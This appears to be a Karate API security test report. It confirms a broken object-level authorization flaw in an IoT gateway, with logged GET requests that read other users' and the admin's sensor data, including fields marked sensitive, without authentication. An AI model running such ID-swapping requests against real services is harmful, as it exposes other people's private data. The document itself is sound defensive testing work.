[{"line":1,"elements":[{"line":3,"name":"","description":"","type":"background","keyword":"Background","steps":[{"name":"url 'http:\/\/192.168.1.109:48080'","result":{"duration":144800300,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"*","line":4}]},{"start_timestamp":"2025-03-26T12:52:08.106Z","line":6,"name":"Verify access to other users' sensor data without proper authorization","description":"","id":"verify-access-to-other-users'-sensor-data-without-proper-authorization","type":"scenario","keyword":"Scenario","steps":[{"name":"path '\/users\/user1\/sensors'","result":{"duration":878100,"status":"passed"},"match":{"location":"karate","arguments":[]},"comments":["# First access a legitimate user's sensors"],"keyword":"Given","line":8},{"name":"method get","result":{"duration":1663174500,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"When","line":9,"doc_string":{"content_type":"","value":"14:52:09.653 request:\n1 > GET http:\/\/192.168.1.109:48080\/users\/user1\/sensors\n1 > Host: 192.168.1.109:48080\n1 > Connection: Keep-Alive\n1 > User-Agent: Apache-HttpClient\/4.5.14 (Java\/11.0.17)\n1 > Accept-Encoding: gzip,deflate\n\n\n14:52:09.744 response time in milliseconds: 79\n1 < 200\n1 < Content-Type: application\/json\n1 < Content-Length: 845\n1 < Server: Werkzeug\/2.0.1 Python\/3.9.21\n1 < Date: Wed, 26 Mar 2025 12:52:11 GMT\n{\"TEMP001\":{\"basic_data\":{\"confidence\":1.0,\"data_source\":\"minimal_format\",\"gateway_timestamp\":1742865408.562495,\"location\":\"greenhouse-1\",\"sensor_id\":\"TEMP001\",\"temperature\":24.139999389648438,\"timestamp\":1742865408,\"type\":\"temperature\",\"unit\":\"celsius\"},\"sensitive_data\":{\"alert_thresholds\":{\"high\":35.0,\"low\":15.0},\"proprietary_settings\":{\"growth_factor\":1.2,\"nutrient_mix\":\"formula-103\"},\"yield_prediction\":\"85.3 tons\/hectare\"}},\"TEMP002\":{\"basic_data\":{\"confidence\":1.0,\"data_source\":\"minimal_format\",\"gateway_timestamp\":1742865405.8499749,\"location\":\"unknown\",\"sensor_id\":\"TEMP002\",\"temperature\":24.32,\"timestamp\":1742865405.0,\"type\":\"unknown\",\"unit\":\"unknown\"},\"sensitive_data\":{\"alert_thresholds\":{\"high\":32.0,\"low\":18.0},\"proprietary_settings\":{\"growth_factor\":1.4,\"nutrient_mix\":\"formula-205\"},\"yield_prediction\":\"92.7 tons\/hectare\"}}}\n\n\n","line":9}},{"name":"status 200","result":{"duration":40500,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"Then","line":10},{"name":"match response != null","result":{"duration":95945900,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"And","line":11},{"name":"match response['TEMP001'] != null","result":{"duration":32105400,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"And","line":12},{"name":"path '\/users\/premium_user\/sensors'","result":{"duration":805100,"status":"passed"},"match":{"location":"karate","arguments":[]},"comments":["# Then access another user's sensors (premium_user) without authentication"],"keyword":"Given","line":15},{"name":"method get","result":{"duration":21748100,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"When","line":16,"doc_string":{"content_type":"","value":"14:52:10.078 request:\n2 > GET http:\/\/192.168.1.109:48080\/users\/premium_user\/sensors\n2 > Host: 192.168.1.109:48080\n2 > Connection: Keep-Alive\n2 > User-Agent: Apache-HttpClient\/4.5.14 (Java\/11.0.17)\n2 > Accept-Encoding: gzip,deflate\n\n\n14:52:10.095 response time in milliseconds: 16\n2 < 200\n2 < Content-Type: application\/json\n2 < Content-Length: 480\n2 < Server: Werkzeug\/2.0.1 Python\/3.9.21\n2 < Date: Wed, 26 Mar 2025 12:52:11 GMT\n{\"TEMP004\":{\"basic_data\":{\"gateway_timestamp\":1742865407.0622792,\"sensor_id\":\"TEMP004\",\"temperature\":24.6,\"timestamp\":1742865407.0611646,\"unit\":\"celsius\"},\"sensitive_data\":{\"advanced_metrics\":{\"crop_stress_indicators\":[0.12,0.08,0.15],\"optimal_harvest_window\":\"2025-07-15 to 2025-07-25\",\"soil_health_index\":89.2},\"alert_thresholds\":{\"high\":34.0,\"low\":17.0},\"proprietary_settings\":{\"growth_factor\":1.8,\"nutrient_mix\":\"premium-formula-X\"},\"yield_prediction\":\"105.2 tons\/hectare\"}}}\n\n\n","line":16}},{"name":"status 200  # This SHOULD fail with 403 but doesn't due to the BOLA vulnerability","result":{"duration":14000,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"Then","line":17},{"name":"match response != null","result":{"duration":1334500,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"And","line":18},{"name":"match response['TEMP004'] != null","result":{"duration":4018500,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"And","line":19},{"name":"match response['TEMP004'].sensitive_data != null","result":{"duration":3934700,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"And","line":20},{"name":"match response['TEMP004'].sensitive_data.proprietary_settings != null","result":{"duration":5490200,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"And","line":21},{"name":"path '\/users\/admin\/sensors'","result":{"duration":1223100,"status":"passed"},"match":{"location":"karate","arguments":[]},"comments":["# Verify we can access admin user's sensors too (this demonstrates the vulnerability)"],"keyword":"Given","line":24},{"name":"method get","result":{"duration":40580000,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"When","line":25,"doc_string":{"content_type":"","value":"14:52:10.125 request:\n3 > GET http:\/\/192.168.1.109:48080\/users\/admin\/sensors\n3 > Host: 192.168.1.109:48080\n3 > Connection: Keep-Alive\n3 > User-Agent: Apache-HttpClient\/4.5.14 (Java\/11.0.17)\n3 > Accept-Encoding: gzip,deflate\n\n\n14:52:10.150 response time in milliseconds: 22\n3 < 200\n3 < Content-Type: application\/json\n3 < Content-Length: 1323\n3 < Server: Werkzeug\/2.0.1 Python\/3.9.21\n3 < Date: Wed, 26 Mar 2025 12:52:11 GMT\n{\"TEMP001\":{\"basic_data\":{\"confidence\":1.0,\"data_source\":\"minimal_format\",\"gateway_timestamp\":1742865408.562495,\"location\":\"greenhouse-1\",\"sensor_id\":\"TEMP001\",\"temperature\":24.139999389648438,\"timestamp\":1742865408,\"type\":\"temperature\",\"unit\":\"celsius\"},\"sensitive_data\":{\"alert_thresholds\":{\"high\":35.0,\"low\":15.0},\"proprietary_settings\":{\"growth_factor\":1.2,\"nutrient_mix\":\"formula-103\"},\"yield_prediction\":\"85.3 tons\/hectare\"}},\"TEMP002\":{\"basic_data\":{\"confidence\":1.0,\"data_source\":\"minimal_format\",\"gateway_timestamp\":1742865405.8499749,\"location\":\"unknown\",\"sensor_id\":\"TEMP002\",\"temperature\":24.32,\"timestamp\":1742865405.0,\"type\":\"unknown\",\"unit\":\"unknown\"},\"sensitive_data\":{\"alert_thresholds\":{\"high\":32.0,\"low\":18.0},\"proprietary_settings\":{\"growth_factor\":1.4,\"nutrient_mix\":\"formula-205\"},\"yield_prediction\":\"92.7 tons\/hectare\"}},\"TEMP004\":{\"basic_data\":{\"gateway_timestamp\":1742865407.0622792,\"sensor_id\":\"TEMP004\",\"temperature\":24.6,\"timestamp\":1742865407.0611646,\"unit\":\"celsius\"},\"sensitive_data\":{\"advanced_metrics\":{\"crop_stress_indicators\":[0.12,0.08,0.15],\"optimal_harvest_window\":\"2025-07-15 to 2025-07-25\",\"soil_health_index\":89.2},\"alert_thresholds\":{\"high\":34.0,\"low\":17.0},\"proprietary_settings\":{\"growth_factor\":1.8,\"nutrient_mix\":\"premium-formula-X\"},\"yield_prediction\":\"105.2 tons\/hectare\"}}}\n\n\n","line":25}},{"name":"status 200  # Again, should require authorization but doesn't","result":{"duration":20400,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"Then","line":26},{"name":"match response != null","result":{"duration":3619700,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"And","line":27}],"tags":[]}],"name":"ID_001_krtestoas_users_user_id_sensors_GET_verified.feature","description":"Test BOLA (Broken Object Level Authorization) vulnerability in IoT Gateway","id":"test-bola-(broken-object-level-authorization)-vulnerability-in-iot-gateway","keyword":"Feature","uri":"ID_001_krtestoas_users_user_id_sensors_GET_verified.feature"}]